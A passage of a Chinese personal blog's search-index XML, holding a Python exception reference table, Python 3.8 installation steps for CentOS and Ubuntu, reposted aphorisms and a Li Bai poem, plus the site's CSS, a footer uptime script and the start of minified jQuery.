(所有数据类型)</td></tr><tr><td>AssertionError</td><td>断言语句失败</td></tr><tr><td>AttributeError</td><td>对象没有这个属性</td></tr><tr><td>EOFError</td><td>没有内建输入,到达EOF标记</td></tr><tr><td>EnvironmentError</td><td>操作系统错误的基类</td></tr><tr><td>IOError</td><td>输入&#x2F;输出操作失败</td></tr><tr><td>OSError</td><td>操作系统错误</td></tr><tr><td>WindowsErro</td><td>系统调用失败</td></tr><tr><td>ImportError</td><td>导入模块&#x2F;对象失败</td></tr><tr><td>LookupError</td><td>无效数据查询的基类</td></tr><tr><td>IndexError</td><td>序列中没有此索引(index)</td></tr><tr><td>KeyError</td><td>映射中没有这个键</td></tr><tr><td>MemoryError</td><td>内存溢出错误(对于Python解释器不是致命的)</td></tr><tr><td>NameError</td><td>未声明&#x2F;初始化对象(没有属性)</td></tr><tr><td>UnboundLocalError</td><td>访问未初始化的本地变量</td></tr><tr><td>ReferenceError</td><td>弱引用(Weak reference)试图访问已经垃圾回收了的对象</td></tr><tr><td>RuntimeError</td><td>一般的运行时错误</td></tr><tr><td>NotImplementedError</td><td>尚未实现的方法</td></tr><tr><td>SyntaxError</td><td>Python语法错误</td></tr><tr><td>IndentationError</td><td>缩进错误</td></tr><tr><td>TabError</td><td>Tab 和空格混用</td></tr><tr><td>SystemError</td><td>一般的解释器系统错误</td></tr><tr><td>TypeError</td><td>对类型无效的操作</td></tr><tr><td>ValueError</td><td>传入无效的参数</td></tr><tr><td>UnicodeError</td><td>Unicode 相关的错误</td></tr><tr><td>UnicodeDecodeError</td><td>Unicode解码时的错误</td></tr><tr><td>UnicodeEncodeError</td><td>Unicode编码时的错误</td></tr><tr><td>UnicodeTranslateError</td><td>Unicode转换时的错误</td></tr><tr><td>Warning</td><td>警告的基类</td></tr><tr><td>DeprecationWarning</td><td>关于被弃用的特征的警告</td></tr><tr><td>FutureWarning</td><td>关于构造将来语义会有改变的警告</td></tr><tr><td>OverflowWarning</td><td>旧的关于自动提升为长整型(long)的警告</td></tr><tr><td>PendingDeprecationWarning</td><td>关于特性将会被废弃的警告</td></tr><tr><td>RuntimeWarning</td><td>可疑的运行时行为(runtime behavior)的警告</td></tr><tr><td>SyntaxWarning</td><td>可疑的语法的警告</td></tr><tr><td>UserWarning</td><td>用户代码生成的警告</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No6：Python安装方法</title>
      <link href="/posts/5467ee79.html"/>
      <url>/posts/5467ee79.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、CentOS7"><a href="#1、CentOS7" class="headerlink" title="1、CentOS7"></a>1、CentOS7</h3><ul><li>安装Python3.8.8</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">准备编译环境</span></span><br><span class="line">sudo yum groupinstall -y &#x27;Development Tools&#x27;</span><br><span class="line">sudo yum install -y kernel-headers zlib-devel bzip2-devel openssl-devel ncurses-devel libffi-devel xz-devel sqlite-devel sqlite*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载Python3.8.8压缩包</span></span><br><span class="line">wget --no-check-certificate https://www.python.org/ftp/python/3.8.8/Python-3.8.8.tgz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建安装目录</span></span><br><span class="line">mkdir /usr/local/python38</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf Python-3.8.8.tgz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到解压后的根目录</span></span><br><span class="line">cd Python-3.8.8/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译安装</span></span><br><span class="line">./configure --with-ssl --prefix=/usr/local/python38</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><ul><li>创建Python3链接</li></ul><p>Linux里原来的python命令还是指向Python2，这里创建python3的软链接指向Python3，这样Python2和Python3就都可以用了。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-snf 强制替换已有的链接</span></span><br><span class="line">ln -snf /usr/local/python38/bin/python3 /usr/bin/python3</span><br></pre></td></tr></table></figure><ul><li>创建Pip3链接</li></ul><p>保留pip指向Pip2，创建pip3的软链接指向Pip3。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-snf 强制替换已有的链接</span></span><br><span class="line">ln -snf /usr/local/python38/bin/pip3 /usr/bin/pip3</span><br></pre></td></tr></table></figure><h3 id="2、Ubuntu16-04"><a href="#2、Ubuntu16-04" class="headerlink" title="2、Ubuntu16.04"></a>2、Ubuntu16.04</h3><ul><li>安装Python3.8</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加源仓库</span></span><br><span class="line">sudo add-apt-repository ppa:jonathonf/python-3.8</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先更新，再安装</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install python3.8</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装pip</span></span><br><span class="line">sudo apt-get install python-pip</span><br><span class="line">sudo apt-get install python3-pip</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">升级pip</span></span><br><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No5：程序员也分三六九等，顶级码农水平，肝一辈子也没用</title>
      <link href="/posts/12dd8f59.html"/>
      <url>/posts/12dd8f59.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>第1级别的程序员，人数屈指可数，就算是再优秀的程序员，也已经不可能达到那个高度。并不是实力不够，时势造英雄罢了。</p><p>排在顶级程序员头部的，只有图灵、冯诺依曼和香农三个人，他们在计算机领域的贡献，无人能及。</p><p>假如没有这三个大佬的贡献，估计全世界1300万程序员都没有这口饭吃。</p></li><li><p>第2级别的大佬仍然遥不可及，他们开创了一整个计算机世界，比如发明B语言的Thompson、发明C语言的丹尼斯·里奇、以及万维网的发明者伯纳斯李。</p></li><li><p>第3级别的程序员们，给世人的印象，已经不再是计算机科学家了，而是赫赫有名的企业实干家。</p><p>比如仙童公司八叛逆天才、思科创始人Bosack、微软的比尔盖茨等等，虽然数量上大了那么许多，但依然人数稀少。</p></li><li><p>第4级别显得更为亲民一些，他们大多是硅谷的英豪。比如传奇工程师卡马克、Google的CEO拉里佩奇、Linux系统发明者林纳斯·托娃兹等等。</p></li><li><p>第5个级别的程序员们有Stanford、MIT、Berkeley、哈佛等Phd研究员，他们对计算机科学有贡献的，但一般不为大众关注。</p><p>但他们对计算机科学的推动，会在某一历史时刻爆发。图灵奖的获得者，几乎都来自这四个学校。</p></li><li><p>第6个级别是FlAG以及微软等专家、研究员，他们通常主导重大项目的开发，最为国人所熟知的，便是李开复。</p></li><li><p>第7个级别是是各大创业大佬，国内熟知的，如求伯君、王江民、李彦宏、周鸿祎等等。</p><p>努力、机遇造就了上述所有的大牛们，比起努力，他们的选择、机遇更加重要，虽然绝大多数人无法成为他们其中的一员。</p><p>但从第8级别以下，通过不懈的努力，完全没有问题。</p></li><li><p>第8个级别BAT专家、研究员。这些人博士居多，也有不少依靠项目起来的大牛，年薪百万级+股票。</p></li><li><p>第9个级别FLAG普通程序员。</p></li><li><p>第10个级别创业公司主程技术老大。水平较为一般，但能胜任绝大部分业务。年薪30万-60万。</p></li><li><p>第11级，普通程序员。</p></li><li><p>第12级，复制粘贴型码农，年薪10万-30万。</p></li><li><p>第13级，菜鸡码畜（去哪复制粘贴还要问的）。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 精选转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No4：知乎点赞最高的70个神回复</title>
      <link href="/posts/39ebe20e.html"/>
      <url>/posts/39ebe20e.html</url>
      
        <content type="html"><![CDATA[<ul><li><p>01、交朋友的标准是什么？</p><p>出世的智者，入世的强者，或者正常而阳光的普通人。</p></li><li><p>02、“别让孩子输在起跑线上”有道理吗？</p><p>一辈子都要和别人去比较，是人生悲剧的源头。</p></li><li><p>03、做哪些事情可以提升生活品质？</p><p>定期扔东西。</p></li><li><p>04、结婚以后两个人在一起最重要的是什么？</p><p>就当这婚还没结。</p></li><li><p>05、把学费拿来念书还是环游世界更合适？为什么？</p><p>在没有充分的知识作为前提的情况下，即使行了万里路，也不过是邮差而已。</p></li><li><p>06、是不是一个人越成熟就越难爱上一个人？</p><p>不是越成熟越难爱上一个人。是越成熟，越能分辨那是不是爱。</p></li><li><p>07、你对自由的理解是什么？</p><p>说“不”的能力。</p></li><li><p>08、你是如何走出人生的阴霾的？</p><p>多走几步。</p></li><li><p>09、哪些技能，经较短时间的学习，就可以给人的生活带来巨大帮助？</p><p>夸奖他人。</p></li><li><p>10、苦难有什么价值？</p><p>永远不要相信苦难是值得的，苦难就是苦难，苦难不会带来成功。苦难不值得追求，磨练意志是因为苦难无法躲开。</p></li><li><p>11、要怎样努力，才能成为很厉害的人？</p><p>如果你注定要成为厉害的人，那问题的答案就深藏在你的血脉里；如果你注定不是厉害的人，那你便只需要做好你自己。</p></li><li><p>12、你在生活中得到过的最好的建议是什么？</p><p>过度自我关注是万恶之源；远不要为尚未发生的事儿拧巴；觉得为时已晚，恰恰是最早的时候。</p></li><li><p>13、前半生与后半生的分界线是在哪里？</p><p>此时此刻。</p></li><li><p>14、同样是别人比自己强，为什么有时会产生嫉妒心理，而有时会产生崇拜？</p><p>远的崇拜，近的嫉妒；够不着的崇拜，够得着的嫉妒；有利益冲突的嫉妒，没利益冲突的崇拜。</p></li><li><p>15、如何让这个世界变得美好？</p><p>把你自己变得更美好。</p></li><li><p>16、二十六岁，工作三年却将留学三年，值得吗？</p><p>普通玩家选择标准配置，高端玩家选择自定义配置。</p></li><li><p>17、世界上有那么多好书好电影注定看不完，我们对这个事实该持何种态度？</p><p>怕什么真理无穷，进一寸有一寸的欢喜。（胡适）</p></li><li><p>18、听过最落寞的一句话或诗句是什么？</p><p>不如意事常八九，可与言者无二三。</p></li><li><p>19、人这一生为什么要努力？</p><p>最痛苦的事，不是失败，是我本可以。</p></li><li><p>20、省钱的好办法有哪些？</p><p>在买任何东西之前牢记九字箴言：你喜欢，你需要，你适合。</p></li><li><p>21、科学和迷信的分界点是哪里？</p><p>我错了。</p></li><li><p>22、哪些行为是浪费时间？</p><p>思而不学＋犹豫不决</p></li><li><p>23、如果好人不一定得到好报，那我们为什么还要做好事？</p><p>我们坚持一件事情，并不是因为这样做了会有效果，而是坚信，这样做是对的。（哈维尔）</p></li><li><p>24、如何看待“年轻的时候需要的是朋友而不是人脉”？</p><p>没有目的之交往，才能感动人。</p></li><li><p>25、有哪些道理是你读了不信、听不进去，直到你亲身经历方笃信不疑的？</p><p>不要低估你的能力，不要高估你的毅力。</p></li><li><p>26、怎么看待励志的书籍？</p><p>看再多，那都是别人的人生。</p></li><li><p>27、你心中的完美爱情是怎么样的？</p><p>可以有不完美。</p></li><li><p>28、王阳明的“知行合一”到底如何理解？又怎样运用到实际生活中？</p><p>知道做不到，等于不知道。</p></li><li><p>29、什么叫见过大世面？</p><p>能享受最好的，能承受最坏的。</p></li><li><p>30、为什么当看到好照片时，人们通常的反应是“真不错，你用的是什么相机？”；当看到烂照片时，则往往笑话拍摄者水平很臭？</p><p>人习惯性地将自己的成功归因于自身，失败归因于环境；而将他人的成功归因于环境，失败归因于其自身。</p></li><li><p>31、如何反驳“现实点，这个社会就是这样”？</p><p>你是怎样，你的世界就是怎样。</p></li><li><p>32、恋爱半年，女朋友觉得没有了开始时的新鲜感，怎么办？</p><p>所谓新鲜感，不是和未知的人一起去做同样的事情，而是和已知的人一起去体验未知的人生。</p></li><li><p>33、情商不高的例子有哪些？</p><p>对陌生人毕恭毕敬，对亲近的人随意发怒。</p></li><li><p>34、三十岁才开始学习编程，靠谱吗？</p><p>种一棵树最好的时间是十年前，其次是现在。</p></li><li><p>35、怎样在有效提出推荐或建议的同时，避免给人灌输和强迫的感觉？</p><p>说服他人不要诉诸理性，应求于利益。</p></li><li><p>36、在一个足够小的星球上行走，我们是在上坡还是下坡？</p><p>你感觉累就是上坡，感觉轻松就是下坡。</p></li><li><p>37、你遇到过哪些让你眼前一亮、醍醐灌顶或对你改变很大的理念？</p><p>天赋决定了你能达到的上限，努力程度决定了你能达到的下限。以绝大多数人的努力程度之低，远远没有达到要去拼天赋的地步。</p></li><li><p>38、扎克伯格初期是怎么保护Facebook的最初创意？为什么Facebook上线后没被其他大公司抄走？</p><p>保护创意的最好方法，就是将其最好地执行。</p></li><li><p>39、如何看待“年轻时就释怀与淡泊，是没有希望的”这句话？</p><p>试图用一句话就来总结复杂的人生，是没有希望的。</p></li><li><p>40、为什么大家都要上大学找工作，而不太喜欢开出租车、开小店、摆街边早餐小吃摊等“短平快”项目？</p><p>孩子，我要求你读书用功，不是因为我要你跟别人比成绩，而是因为，我希望你将来会拥有选择的权利，选择有意义、有时间的工作，而不是被迫谋生。当你的工作在你心中有意义，你就有成就感。当你的工作给你时间，不剥夺你的生活，你就有尊严。成就感和尊严，给你快乐。（龙应台）</p></li><li><p>41、长期的异国生活，改变了你的哪些“是非观”？</p><p>很多事情，只是不同，并无是非。</p></li><li><p>42、向喜欢的女生表白被拒绝了，还是喜欢她，怎么办？</p><p>也许你弄错了什么是表白。表白应该是最终胜利时的号角，而不应该是发起进攻的冲锋号。</p></li><li><p>43、最能燃起你学习激情的一句话是什么？</p><p>你不能把这个世界，让给你所鄙视的人。</p></li><li><p>44、有哪些我们熟知的名言其实还有后半句？</p><p>人是生而自由的，但无往不在枷锁之中，自以为是其他一切主人的人，反而比其他一切更是奴隶。</p></li><li><p>45、脱贫重要还是脱单重要？</p><p>不谈恋爱死不了，脱贫比脱单更重要。</p></li><li><p>46、怎样才能在争论中胜过别人？</p><p>不要跟眼界不一样的人争辩。</p></li><li><p>47、怎样才能成为一个勇敢的人？</p><p>做你害怕做的事情，然后你发现，不过如此。</p></li><li><p>48、怎样才能和三观不合的人做朋友？</p><p>三观不合真的很难做朋友，因为思想，经历，感官，全都不一样。就像我说大海很漂亮，你却说淹死过很多人。</p></li><li><p>49、刚刚结束了一段十年的爱情，我的人生还有什么意义？</p><p>年轻的时候，我们爱得死去活来，可随着年岁渐长，你就会发现，爱情并不是生活的全部。善良，努力，读书，健身，让自己变得更好才是人生最重要的事。</p></li><li><p>50、为什么我总会对失去的东西念念不忘？</p><p>如果你丢了一部iPhone7，你妈妈知道了又给你买了一部iPhoneX，你还是会很高兴；如果你的对象跟你分手，但是你爱慕已久的男神却跟你表白，你还是会不由自主地高兴起来。人们并不是害怕失去，而是害怕失去以后没有更好的可以代替。</p></li><li><p>51、怎样控制住自己不发脾气？</p><p>如果你是对的，你没必要发脾气；如果你是错的，你没资格发脾气。</p></li><li><p>52、用什么方式寻求别人的帮助才不会被拒绝？</p><p>求人不如求己，靠得住的永远都是自己。</p></li><li><p>53、被前任伤得很惨，可每次他对我稍微流露出一点温情，我就忍不住又去亲近他，怎么办？</p><p>再爱的前任，提一次复合就够了。你可以爱三五个人渣，但你不能爱一个人渣三五次。</p></li><li><p>54、生活是一时艰辛，还是始终如此？</p><p>成人的世界里，本没有容易二字。</p></li><li><p>55、“有情饮水饱”这句话对吗？</p><p>结婚过日子，钱真的很重要，贫贱夫妻百事哀。</p></li><li><p>56、当别人帮了你的忙，要不要用财物来感谢他？</p><p>能用钱解决的事情，千万不要用人情。</p></li><li><p>57、“便宜没好货”是一定的吗？</p><p>便宜的东西，只有在你买的那一刻是开心的，用的时侯没有一天是开心的；品质好的东西，给钱那一刻是心疼的，用的时侯每天都是快乐的，感觉特别值得。</p></li><li><p>58、为什么我想要的东西始终的不到？</p><p>你越在意什么，什么就会折磨你。</p></li><li><p>59、经历多少次失败，才能找到真爱？</p><p>所有的失恋都是在给真爱让路。</p></li><li><p>60、男友总说“忙”不陪我，是借口吗？</p><p>想送你回家的人，东南西北都顺路；愿陪你吃饭的人，酸甜苦辣都爱吃；想见你的人，千山万水都能赶来。</p></li><li><p>61、做事总也学不会走捷径，怎么办？</p><p>那些依靠投机取巧走上“人生巅峰”的人，总有一天，会因为一件不经意的小事露出马脚。</p></li><li><p>62、太在乎自己在别人眼中的形象，导致活得很累，怎么办？</p><p>没有那么多人关注你，所以，放轻松点，你没有那么多观众。</p></li><li><p>63、怎样才能找到一个贴心的知己？</p><p>有时候，你把别人当好朋友，但人家并没有这么想。你所有的朋友都活着，但你还会感到孤独。</p></li><li><p>64、在当下社会，怎样做一个善良但不软弱的人？</p><p>永远不要忘记善良。但也不要“过于”善良，因为人们只会挑软柿子捏。</p></li><li><p>65、怎样挽回一段频临破裂的友谊？</p><p>无论是友情还是爱情，跟谁在一起舒服就和谁在一起，累了就躲远一点。你取悦别人的模样，真的不好看。</p></li><li><p>66、怎样判断是不是真爱？</p><p>一个人不主动联系你就是不想你，也可能就是不喜欢你；对话时总是三言两语就是对你没兴趣；说一大串走心的话却没有实际行动的,就是把你当备胎。不要再为别人找借口了，事实上，Ta没那么喜欢你，尽快直面或者放弃吧。</p></li><li><p>67、拒绝别人最有礼貌的方式是什么？</p><p>别不好意思拒绝，那些好意思为难你的人，反正也都不是什么好人。</p></li><li><p>68、感情与利益会有冲突吗？</p><p>在利益面前，感情是次要的。利益一致的人，讨厌的人也可以变成同盟队友。利益冲突，亲密的朋友也可能化友为敌。</p></li><li><p>69、为什么我评价别人，总是得不到认同？</p><p>如果不能感同身受，就不要肆意地妄加评判。</p></li><li><p>70、看上去彼此都没有做错什么，为什么会渐行渐远？</p><p>所有关系变淡的原因：一个不说，一个不问；或者一个问得尴尬，一个答得敷衍。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 精选转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No3：平头哥人生格言</title>
      <link href="/posts/2b305057.html"/>
      <url>/posts/2b305057.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>生死看淡，不服就干。</p></li><li><p>我只想整死各位，或者被各位整死。</p></li><li><p>别人的是我的，我的还是我的。</p></li><li><p>我也不想针对谁，在我眼里你们都能吃。</p></li><li><p>我干起仗来，我自己都怕。</p></li><li><p>平头白发银披风，非洲大地我最凶。</p></li><li><p>我这一生就是太忙碌了，不是干架，就是在干架的路上。</p></li><li><p>从不记仇，有仇当场就报了。</p></li><li><p>张狂不是我的本性，但是惹我就等于自杀。</p></li><li><p>每次打架别和我说对方有多少人，我只要时间和地点。</p></li><li><p>一獾斗三虎，三獾沉航母，五獾斗上帝，十獾创世纪。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 心得感悟 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随手记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No2：侠客行</title>
      <link href="/posts/9f1b6a41.html"/>
      <url>/posts/9f1b6a41.html</url>
      
        <content type="html"><![CDATA[<p>赵客缦胡缨，吴钩霜雪明。</p><p>银鞍照白马，飒沓如流星。</p><p>十步杀一人，千里不留行。</p><p>事了拂衣去，深藏身与名。</p><p>闲过信陵饮，脱剑膝前横。</p><p>将炙啖朱亥，持觞劝侯嬴。</p><p>三杯吐然诺，五岳倒为轻。</p><p>眼花耳热后，意气素霓生。</p><p>救赵挥金槌，邯郸先震惊。</p><p>千秋二壮士，烜赫大梁城。</p><p>纵死侠骨香，不惭世上英。</p><p>谁能书阁下，白首太玄经。</p>]]></content>
      
      
      <categories>
          
          <category> 心得感悟 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随手记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No1：一些引人深思的话</title>
      <link href="/posts/827a742a.html"/>
      <url>/posts/827a742a.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>世上哪有什么岁月静好，只不过有人在替你负重前行。</p></li><li><p>正义也许会迟到，但绝不会缺席，可是迟到的正义还是正义吗？</p></li><li><p>识不足则多虑；威不足则多怒；信不足则多言。</p></li><li><p>文化是根植于内心的修养，是无需提醒的自觉，是以约束为前提的自由，是为别人着想的善良。</p></li><li><p>大圣，此去欲何？踏南天，碎凌霄！若一去不回？便一去不回！</p></li><li><p>生活的苦难可以被疲劳麻痹，被娱乐转移，无论如何只要还生存着，行尸走肉也可以得过且过，最终习以为常，可以称之为钝化。<br>而学习的痛苦在于，你始终要保持敏锐的触感，保持清醒的认知，而且你要主动去获得，这不妨叫锐化。<br>被钝化的人就像是温水煮青蛙一样，热水加热到一定程度之后再也跳不出去了，吃学习的苦只是短暂的，而吃生活的苦却是长期的。</p></li><li><p>所以我时常害怕，愿中国青年都摆脱冷气，只是向上走，不必听自暴自弃者流的话。能做事的做事，能发声的发声。有一分热，发一分光，就令萤火一般，也可以在黑暗里发一点光，不必等待炬火。<br>此后如竟没有炬火：我便是唯一的光。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 心得感悟 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随手记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/static/css/mystyle.css"/>
      <url>/static/css/mystyle.css</url>
      
        <content type="html"><![CDATA[/*页脚*/#footer {    background-color: rgb(128, 128, 128);}/*导航栏常驻*/#nav {    transition: none !important;    -webkit-transition: none !important;    -moz-transition: none !important;    -ms-transition: none !important;    -o-transition: none !important;}/*首页文章封面，保持原有尺寸比例，内容被缩放*/.recent-posts .recent-post-item a img {    width: 100% !important;    height: 100% !important;    object-fit: contain !important;}/*文章列表封面，保持原有尺寸比例，内容被缩放*/.article-sort .article-sort-item a img {    width: 100% !important;    height: 100% !important;    object-fit: contain !important;}/*最新文章封面，保持原有尺寸比例，内容被缩放*/.aside-content .aside-list-item a img {    width: 100% !important;    height: 100% !important;    object-fit: contain !important;}/*相关推荐封面，保持原有尺寸比例，内容被缩放*/.relatedPosts-list div a img {    width: 100% !important;    height: 100% !important;    object-fit: contain !important;}/*上下翻页封面，保持原有尺寸比例，内容被缩放*/.pagination-post div a img {    width: 100% !important;    height: 100% !important;    object-fit: contain !important;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/static/js/foot.js"/>
      <url>/static/js/foot.js</url>
      
        <content type="html"><![CDATA[// 动态心跳，更改自己的名称$(document).ready(function (e) {    $('.copyright').html('Copyright © 2019-2029 <i class="fa-fw fas fa-heartbeat card-announcement-animation cc_pointer"></i> By Gilmty');})$(document).ready(function (e) {    show_date_time();})//本站运行时间，更改自己建立站点的时间function show_date_time() {    $('.framework-info').html('本站已运行 <span id="span_dt_dt" style="color: #fff;"></span>');    window.setTimeout("show_date_time()", 1000);    BirthDay = new Date("1/1/2019 0:0:0");    today = new Date();    timeold = (today.getTime() - BirthDay.getTime());    sectimeold = timeold / 1000    secondsold = Math.floor(sectimeold);    msPerDay = 24 * 60 * 60 * 1000    e_daysold = timeold / msPerDay    daysold = Math.floor(e_daysold);    e_hrsold = (e_daysold - daysold) * 24;    hrsold = Math.floor(e_hrsold);    e_minsold = (e_hrsold - hrsold) * 60;    minsold = Math.floor((e_hrsold - hrsold) * 60);    seconds = Math.floor((e_minsold - minsold) * 60);    span_dt_dt.innerHTML = '<font style=color:#afb4db>' + daysold + '</font> 天 <font style=color:#f391a9>' + hrsold + '</font> 时 <font style=color:#fdb933>' + minsold + '</font> 分 <font style=color:#a3cf62>' + seconds + '</font> 秒';}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/static/js/jquery.js"/>
      <url>/static/js/jquery.js</url>
      
        <content type="html"><![CDATA[/*! jQuery v3.6.1 | (c) OpenJS Foundation and other contributors | jquery.org/license */!function(e,t){"use strict";"object"==typeof module&&"object"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(C,e){"use strict";var t=[],r=Object.getPrototypeOf,s=t.slice,g=t.flat?function(e){return t.flat.call(e)}:function(e){return t.concat.apply([],e)},u=t.push,i=t.indexOf,n={},o=n.toString,y=n.hasOwnProperty,a=y.toString,l=a.call(Object),v={},m=function(e){return"function"==typeof e&&"number"!=typeof e.nodeType&&"function"!=typeof e.item},x=function(e){return null!=e&&e===e.window},E=C.document,c={type:!0,src:!0,nonce:!0,noModule:!0};function b(e,t,n){var r,i,o=(n=n||E).createElement("script");if(o.text=e,t)for(r in c)(i=t[r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode.removeChild(o)}function w(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?n[o.call(e)]||"object":typeof e}var f="3.6.1",S=function(e,t){return new S.fn.init(e,t)};function p(e){var t=!!e&&"length"in e&&e.length,n=w(e);return!m(e)&&!x(e)&&("array"===n||0===t||"number"==typeof t&&0<t&&t-1 in e)}S.fn=S.prototype={jquery:f,constructor:S,length:0,toArray:function(){return s.call(this)},get:function(e){return null==e?s.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=S.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return S.each(this,e)},map:function(n){return this.pushStack(S.map(this,function(e,t){return n.call(e,t,e)}))},slice:function(){return this.pushStack(s.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},even:function(){return this.pushStack(S.grep(this,function(e,t){return(t+1)%2}))},odd:function(){return this.pushStack(S.grep(this,function(e,t){return t%2}))},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(0<=n&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:u,sort:t.sort,splice:t.splice},S.extend=S.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for("boolean"==typeof a&&(l=a,a=arguments[s]||{},s++),"object"==typeof a||m(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)r=e[t],"__proto__"!==t&&a!==r&&(l&&r&&(S.isPlainObject(r)||(i=Array.isArray(r)))?(n=a[t],o=i&&!Array.isArray(n)?[]:i||S.isPlainObject(n)?n:{},i=!1,a[t]=S.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},S.extend({expando:"jQuery"+(f+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||"[object Object]"!==o.call(e))&&(!(t=r(e))||"function"==typeof(n=y.call(t,"constructor")&&t.constructor)&&a.call(n)===l)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e,t,n){b(e,{nonce:t&&t.nonce},n)},each:function(e,t){var n,r=0;if(p(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},makeArray:function(e,t){var n=t||[];return null!=e&&(p(Object(e))?S.merge(n,"string"==typeof e?[e]:e):u.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:i.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r=[],i=0,o=e.length,a=!n;i<o;i++)!t(e[i],i)!==a&&r.push(e[i]);return r},map:function(e,t,n){var r,i,o=0,a=[];if(p(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&a.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&a.push(i);return g(a)},guid:1,support:v}),"function"==typeof Symbol&&(S.fn[Symbol.iterator]=t[Symbol.iterator]),S.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(e,t){n["[object "+t+"]"]=t.toLowerCase()});var d=function(n){var e,d,b,o,i,h,f,g,w,u,l,T,C,a,E,y,s,c,v,S="sizzle"+1*new Date,p=n.document,k=0,r=0,m=ue(),x=ue(),A=ue(),N=ue(),j=function(e,t){return e===t&&(l=!0),0},D={}.hasOwnProperty,t=[],q=t.pop,L=t.push,H=t.push,O=t.slice,P=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return 